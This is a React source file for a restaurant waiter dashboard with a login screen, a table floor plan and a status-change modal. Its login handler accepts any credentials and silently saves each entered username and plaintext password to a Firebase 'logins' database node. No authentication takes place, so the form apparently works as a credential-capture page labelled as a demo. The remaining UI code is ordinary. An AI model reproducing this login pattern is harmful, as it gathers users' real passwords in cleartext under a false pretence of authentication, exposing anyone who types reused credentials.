import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { User, Lock, LogIn, Users, LogOut, RefreshCw, Shield, Activity } from 'lucide-react';
import { db, ref, push, set } from '../firebase';


const WaiterDashboard = () => {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [selectedTable, setSelectedTable] = useState(null);
  const [showStatusMenu, setShowStatusMenu] = useState(false);

  // Table data with status management
  const [tables, setTables] = useState([
    { id: 1, x: 120, y: 140, status: 'free', guests: 0, time: null },
    { id: 2, x: 280, y: 140, status: 'occupied', guests: 4, time: '7:30 PM' },
    { id: 3, x: 440, y: 140, status: 'reserved', guests: 2, time: '8:00 PM' },
    { id: 4, x: 600, y: 140, status: 'free', guests: 0, time: null },
    { id: 5, x: 120, y: 240, status: 'occupied', guests: 3, time: '6:45 PM' },
    { id: 6, x: 280, y: 240, status: 'free', guests: 0, time: null },
    { id: 7, x: 440, y: 240, status: 'reserved', guests: 6, time: '8:30 PM' },
    { id: 8, x: 600, y: 240, status: 'occupied', guests: 2, time: '7:15 PM' },
  ]);

  const statusColors = {
    free: { fill: '#10b981', stroke: '#059669', text: 'Free' },
    reserved: { fill: '#f59e0b', stroke: '#d97706', text: 'Reserved' },
    occupied: { fill: '#ef4444', stroke: '#dc2626', text: 'Occupied' }
  };

  const handleLogin = async (e) => {
  e.preventDefault();
  setIsLoggingIn(true);

  // Simulate a delay (remove if using real auth)
  await new Promise(resolve => setTimeout(resolve, 1500));

  // 🔥 Save login data to Firebase Realtime Database
  try {
    const loginRef = ref(db, 'logins');
    const newLoginRef = push(loginRef);
    await set(newLoginRef, {
      username,
      password,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error("Error saving login:", error);
  }

  setIsLoggingIn(false);
  setIsLoggedIn(true);
};


  const handleTableClick = (tableId) => {
    setSelectedTable(tableId);
    setShowStatusMenu(true);
  };

  const updateTableStatus = (tableId, newStatus) => {
    setTables(prevTables => 
      prevTables.map(table => 
        table.id === tableId 
          ? { ...table, status: newStatus }
          : table
      )
    );
    setShowStatusMenu(false);
    setSelectedTable(null);
  };

  const handleLogout = () => {
    setIsLoggedIn(false);
    setUsername('');
    setPassword('');
    setSelectedTable(null);
    setShowStatusMenu(false);
  };

  // Simple page transition
  const pageVariants = {
    initial: { opacity: 0, x: 100 },
    in: { opacity: 1, x: 0 },
    out: { opacity: 0, x: -100 }
  };

  const pageTransition = {
    type: 'tween',
    ease: 'anticipate',
    duration: 0.5
  };

  // Login Screen
  if (!isLoggedIn) {
    return (
      <motion.div
        key="login"
        initial="initial"
        animate="in"
        exit="out"
        variants={pageVariants}
        transition={pageTransition}
        className="min-h-screen bg-gradient-to-br from-blue-50 via-indigo-50 to-purple-50 flex items-center justify-center p-4"
      >
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          <div className="absolute -top-40 -right-40 w-80 h-80 bg-gradient-to-br from-blue-200 to-indigo-300 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-pulse"></div>
          <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-gradient-to-br from-indigo-200 to-purple-300 rounded-full mix-blend-multiply filter blur-3xl opacity-30 animate-pulse"></div>
        </div>

        <div className="w-full max-w-md mx-auto relative z-10 px-4 sm:px-6">
          {/* Header */}
          <div className="text-center mb-6 sm:mb-8">
            <div className="inline-flex items-center justify-center w-14 h-14 sm:w-16 sm:h-16 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-full mb-4 shadow-lg relative">
              <Users className="w-7 h-7 sm:w-8 sm:h-8 text-white" />
              <div className="absolute -top-1 -right-1">
                <Shield className="w-4 h-4 text-blue-300" />
              </div>
            </div>
            <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-gray-900 mb-2">Waiter Dashboard</h1>
            <p className="text-sm sm:text-base text-gray-600">Sign in to manage table reservations</p>
          </div>

          {/* Login Form */}
          <form
            onSubmit={handleLogin}
            className="bg-white rounded-2xl shadow-xl p-6 sm:p-8 backdrop-blur-sm border border-gray-100"
          >
            <div className="space-y-4 sm:space-y-6">
              {/* Username Input */}
              <div>
                <label htmlFor="username" className="block text-sm font-semibold text-gray-700 mb-2">
                  Username
                </label>
                <div className="relative">
                  <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type="text"
                    id="username"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="Enter your username"
                    required
                    className="w-full pl-10 pr-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 bg-gray-50 hover:bg-white focus:scale-105 text-sm sm:text-base"
                  />
                </div>
              </div>

              {/* Password Input */}
              <div>
                <label htmlFor="password" className="block text-sm font-semibold text-gray-700 mb-2">
                  Password
                </label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type="password"
                    id="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Enter your password"
                    required
                    className="w-full pl-10 pr-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 bg-gray-50 hover:bg-white focus:scale-105 text-sm sm:text-base"
                  />
                </div>
              </div>

              {/* Login Button */}
              <div>
                <button
                  type="submit"
                  disabled={isLoggingIn}
                  className="w-full bg-gradient-to-r from-blue-500 to-indigo-600 text-white font-semibold py-3 sm:py-4 px-6 rounded-xl shadow-lg transition-all duration-300 flex items-center justify-center space-x-2 disabled:opacity-50 disabled:cursor-not-allowed hover:scale-105 hover:-translate-y-1 hover:shadow-xl text-sm sm:text-base"
                >
                  {isLoggingIn ? (
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  ) : (
                    <>
                      <LogIn className="w-4 h-4 sm:w-5 sm:h-5" />
                      <span>Sign In</span>
                    </>
                  )}
                </button>
              </div>
            </div>

            {/* Demo Credentials */}
            <div className="mt-4 sm:mt-6 p-3 sm:p-4 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-xl border border-blue-100">
              <p className="text-xs sm:text-sm text-blue-700 text-center">
                <span className="font-semibold">Demo:</span> Use any username and password to login
              </p>
            </div>
          </form>
        </div>
      </motion.div>
    );
  }

  // Dashboard Screen
  return (
    <motion.div
      key="dashboard"
      initial="initial"
      animate="in"
      exit="out"
      variants={pageVariants}
      transition={pageTransition}
      className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 p-4"
    >
      <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        {/* Header - Centered with proper spacing for toggle buttons */}
        <div className="flex flex-col items-center justify-center mb-6 sm:mb-8 pt-16 sm:pt-20 relative">
          <div className="text-center">
            <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-gray-900 mb-2">Table Management</h1>
            <p className="text-sm sm:text-base text-gray-600">Monitor and update table statuses in real-time</p>
          </div>
          
          {/* Logout button positioned absolutely */}
          <button
            onClick={handleLogout}
            className="absolute top-0 right-0 flex items-center space-x-2 bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-2 px-4 rounded-xl hover:scale-105 transition-all duration-200 text-sm sm:text-base"
          >
            <LogOut className="w-4 h-4" />
            <span>Logout</span>
          </button>
        </div>

        {/* Status Summary */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6 mb-6 sm:mb-8">
          <div className="bg-white rounded-xl p-4 sm:p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-shadow duration-300">
            <div className="flex items-center space-x-3">
              <div className="w-4 h-4 bg-green-500 rounded-full animate-pulse" />
              <div>
                <p className="text-sm font-medium text-gray-600">Free Tables</p>
                <p className="text-2xl sm:text-3xl font-bold text-gray-900">
                  {tables.filter(t => t.status === 'free').length}
                </p>
              </div>
            </div>
          </div>
          
          <div className="bg-white rounded-xl p-4 sm:p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-shadow duration-300">
            <div className="flex items-center space-x-3">
              <div className="w-4 h-4 bg-yellow-500 rounded-full animate-pulse" />
              <div>
                <p className="text-sm font-medium text-gray-600">Reserved</p>
                <p className="text-2xl sm:text-3xl font-bold text-gray-900">
                  {tables.filter(t => t.status === 'reserved').length}
                </p>
              </div>
            </div>
          </div>
          
          <div className="bg-white rounded-xl p-4 sm:p-6 shadow-lg border border-gray-100 hover:shadow-xl transition-shadow duration-300 sm:col-span-2 lg:col-span-1">
            <div className="flex items-center space-x-3">
              <div className="w-4 h-4 bg-red-500 rounded-full animate-pulse" />
              <div>
                <p className="text-sm font-medium text-gray-600">Occupied</p>
                <p className="text-2xl sm:text-3xl font-bold text-gray-900">
                  {tables.filter(t => t.status === 'occupied').length}
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Floor Plan */}
        <div className="bg-white rounded-2xl shadow-xl p-4 sm:p-6 lg:p-8 backdrop-blur-sm border border-gray-100">
          <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-4 sm:mb-6 space-y-3 sm:space-y-0">
            <h3 className="text-lg sm:text-xl font-semibold text-gray-800">Restaurant Floor Plan</h3>
            <button className="flex items-center space-x-2 bg-blue-100 hover:bg-blue-200 text-blue-700 font-medium py-2 px-3 rounded-lg hover:scale-105 transition-all duration-200 text-sm sm:text-base">
              <RefreshCw className="w-4 h-4" />
              <span>Refresh</span>
            </button>
          </div>
          
          <div className="bg-gray-50 rounded-xl p-3 sm:p-4 lg:p-6 overflow-x-auto">
            <svg
              viewBox="0 0 750 320"
              className="w-full h-auto max-w-full min-w-[600px] sm:min-w-[750px]"
            >
              {/* Restaurant background */}
              <rect x="0" y="0" width="750" height="320" fill="#f9fafb" stroke="#e5e7eb" strokeWidth="2" rx="10" />
              
              {/* Kitchen area */}
              <rect x="20" y="20" width="180" height="80" fill="#fef3c7" stroke="#f59e0b" strokeWidth="2" rx="8" />
              <text x="110" y="65" textAnchor="middle" className="text-sm font-semibold fill-amber-700">Kitchen</text>
              
              {/* Bar area */}
              <rect x="550" y="20" width="180" height="80" fill="#ddd6fe" stroke="#8b5cf6" strokeWidth="2" rx="8" />
              <text x="640" y="65" textAnchor="middle" className="text-sm font-semibold fill-purple-700">Bar</text>
              
              {/* Entrance */}
              <rect x="320" y="280" width="110" height="30" fill="#e5e7eb" stroke="#9ca3af" strokeWidth="1" rx="5" />
              <text x="375" y="300" textAnchor="middle" className="text-xs font-medium fill-gray-600">Entrance</text>
              
              {/* Tables */}
              {tables.map((table) => (
                <g key={table.id}>
                  <circle
                    cx={table.x}
                    cy={table.y}
                    r="35"
                    fill={statusColors[table.status].fill}
                    stroke={statusColors[table.status].stroke}
                    strokeWidth="3"
                    className="cursor-pointer transition-all duration-200 hover:scale-110"
                    style={{
                      filter: 'drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1))',
                      transformOrigin: `${table.x}px ${table.y}px`
                    }}
                    onClick={() => handleTableClick(table.id)}
                  />
                  <text
                    x={table.x}
                    y={table.y - 5}
                    textAnchor="middle"
                    className="text-sm font-bold fill-white pointer-events-none"
                  >
                    {table.id}
                  </text>
                  {table.status !== 'free' && (
                    <text
                      x={table.x}
                      y={table.y + 8}
                      textAnchor="middle"
                      className="text-xs font-medium fill-white pointer-events-none"
                    >
                      {table.guests}p
                    </text>
                  )}
                </g>
              ))}
              
              {/* Legend */}
              <g transform="translate(30, 280)">
                <circle cx="12" cy="12" r="10" fill="#10b981" stroke="#059669" strokeWidth="2" />
                <text x="30" y="17" className="text-xs fill-gray-600">Free</text>
                
                <circle cx="80" cy="12" r="10" fill="#f59e0b" stroke="#d97706" strokeWidth="2" />
                <text x="98" y="17" className="text-xs fill-gray-600">Reserved</text>
                
                <circle cx="170" cy="12" r="10" fill="#ef4444" stroke="#dc2626" strokeWidth="2" />
                <text x="188" y="17" className="text-xs fill-gray-600">Occupied</text>
              </g>
            </svg>
          </div>
        </div>
      </div>

      {/* Status Change Modal */}
      <AnimatePresence>
        {showStatusMenu && selectedTable && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50"
            onClick={() => setShowStatusMenu(false)}
          >
            <motion.div
              initial={{ opacity: 0, scale: 0.8, y: 50 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.8, y: 50 }}
              transition={{ duration: 0.3 }}
              onClick={(e) => e.stopPropagation()}
              className="bg-white rounded-2xl shadow-2xl p-6 max-w-sm w-full mx-4"
            >
              <h3 className="text-xl font-bold text-gray-900 mb-4 text-center">
                Update Table {selectedTable}
              </h3>
              
              <div className="space-y-3">
                {Object.entries(statusColors).map(([status, config]) => (
                  <button
                    key={status}
                    onClick={() => updateTableStatus(selectedTable, status)}
                    className="w-full flex items-center space-x-3 p-4 rounded-xl border-2 border-gray-200 hover:border-gray-300 hover:scale-105 transition-all duration-200"
                    style={{
                      backgroundColor: tables.find(t => t.id === selectedTable)?.status === status ? `${config.fill}20` : 'transparent'
                    }}
                  >
                    <div 
                      className="w-4 h-4 rounded-full animate-pulse"
                      style={{ backgroundColor: config.fill }}
                    />
                    <span className="font-medium text-gray-700">{config.text}</span>
                  </button>
                ))}
              </div>
              
              <button
                onClick={() => setShowStatusMenu(false)}
                className="w-full mt-4 bg-gray-100 text-gray-700 font-semibold py-3 px-4 rounded-xl hover:bg-gray-200 hover:scale-105 transition-all duration-200"
              >
                Cancel
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.div>
  );
};

export default WaiterDashboard;